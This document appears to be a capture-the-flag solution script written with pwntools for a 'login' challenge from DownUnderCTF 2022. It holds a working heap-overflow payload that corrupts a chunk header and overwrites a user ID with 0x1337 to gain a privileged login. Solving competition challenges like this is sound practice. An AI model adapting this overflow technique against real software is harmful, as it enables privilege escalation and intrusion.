#!/usr/bin/env python3

from pwn import *

# Set up pwntools for the correct architecture
# context.update(arch='i386')
exe = './login'

context.terminal = ['gnome-terminal', '--command']
# context.terminal = ["tmux", "splitw", "-v"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b login
continue
x/32x (int*) users
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

if args.LOCAL:
    io = start()
else:
    io = remote("2022.ductf.dev",30025)
# io.recvuntil('> ')

io.sendline('1') # create user
io.recvline()
io.sendline('0') #len
io.recvline()
# io.sendline(b'A'*20 + b'\x10\x00\x00')

'''
0x560989d3b2a0: 0x00001338  0x00000030  0x00000000  0x00000000
0x560989d3b2b0: 0x00000000  0x00000000  0x00000021  0x00000000 -> 7x8=56 til the next chunk, then 37130000, then another 24 A's
0x560989d3b2c0: 0x00001339  0x00000031  0x00000000  0x00000000
0x560989d3b2d0: 0x00000000  0x00000000  0x00000021  0x00000000
'''

prev_size = b"\x21\x00\x00\x00" # preserve the prev_size chunk marker thing
top_size = b"\x51\x0d\02\x00"

payload = b"B" * 20 +  top_size   +   b"\x00" * 4 + b"\x37\x13\x00\x00"
##       ^^^^ fill up  ^ chunk hdr      ^ junk      ^ 0x1337 uid         

io.sendline(payload)

# now add a user
io.sendline('1')
io.recvline()
io.sendline('2') #len 2
io.recvline()
io.sendline('A')
io.recvline()
io.sendline('2') # login
io.recvline()
io.sendline('A')
io.interactive()
